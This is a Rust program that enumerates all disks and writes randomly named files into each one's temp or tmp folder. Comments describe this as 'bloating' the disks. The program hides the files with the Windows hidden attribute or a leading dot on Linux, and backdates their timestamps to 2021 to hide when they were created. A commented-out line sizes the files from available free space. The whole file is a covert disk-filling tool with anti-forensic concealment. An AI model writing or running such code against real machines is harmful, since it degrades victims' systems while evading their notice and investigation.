extern crate winapi;

use core::slice;
use std::fs::*;
use std::io::*;

#[cfg(target_os = "windows")]
use std::os::windows::prelude::*;

use std::path::Path;
use rand::Rng;
use regex::Regex;
use sysinfo::Disks;
use filetime::{set_file_times,FileTime};


// Slice the string to get the root disk letter if it's Windows
fn slice_string(input: &str) -> &str {
	// Define the pattern to detect the filesystem : Windows or Unix
	let pattern = Regex::new(r"(\\)|(/)").unwrap();
	let parts: Vec<&str> = pattern.split(input).collect();

	// Return the root folder
	return parts[0];
}

#[cfg(target_os = "windows")]
fn create_file(path: &str, name:u64, data: Vec<u8>) -> String{	

	let path_file: String = format!("{}{}.bh",path,name);

	let _ = File::options().create(true).write(true).attributes(winapi::um::winnt::FILE_ATTRIBUTE_HIDDEN).open(&path_file).expect("Valid filepath").write_all(&data);

	return path_file

}

#[cfg(target_os = "linux")]
fn create_file(path: &str, name:u64, data: Vec<u8>) -> String{	

	let path_file: String = format!("{}.{}.bh",path,name);

	// Create an hidden file (linux only)
	let mut file = File::create(&path_file);
	let _ = file.write_all(&data);

	return path_file

}





fn main() -> std::io::Result<()> {

	// Get a list of the disks on the machine
	let disks = Disks::new_with_refreshed_list();	
	let mut disk_array = Vec::new();

	// Add all the disks found in an array
	for disk in &disks {
		let info:(&str, u64, u64) = (slice_string(disk.mount_point().to_str().unwrap()), disk.total_space(), disk.available_space());		
		disk_array.push(info);
		println!("Disk : {:?}",info);

	}	

	// Bloating each disks found
	for disk in disk_array{

		// Separate informations of the disk found
		let (disk_root, total_space, available_space) = disk;

		// Search for a valid path to write to
		let mut valid_path = String::new();
		// tmp or temp folder don't need admin access to write to
		let path_array = [r"/temp/", r"/tmp/"];
		let mut has_found_path = false;

		for path in path_array {
		let temp_path:String = format!("{}{}",disk_root, path).as_str().to_string();
		println!("Trying path : {}", temp_path);
		// If a valid path is found
		if Path::new(&temp_path).is_dir() {
			valid_path = temp_path; 
			println!("Valid path : {}", valid_path);
			has_found_path = true;
			break;
			}
		}

		if !has_found_path{
			continue
		}
		// At this point, we found a valid folder for the disk

		// Create a random number
		let mut rng = rand::thread_rng();
		
		// Create the files
		for _ in 1..2{

			// Generate a random numbers
			let n2:u64 = rng.gen();

			// 1Mo =  1_048_576
			// 16Mo = 16_777_216
			// 128Mo = 134_217_728

			let size = available_space / 100;

			// Vec with specified size (number of elements in the vector)
			//let encoded: Vec<u8> = vec![0;size.try_into().unwrap()];
			let encoded: Vec<u8> = vec![0;1_048_576];

			let path_file: String = create_file(&valid_path,n2,encoded);
			
			// Change the access and modified date
			set_file_times(path_file, FileTime::from_unix_time(1611048846,0),FileTime::from_unix_time(1611048846,0));

			}

	}	

	Ok(())

}
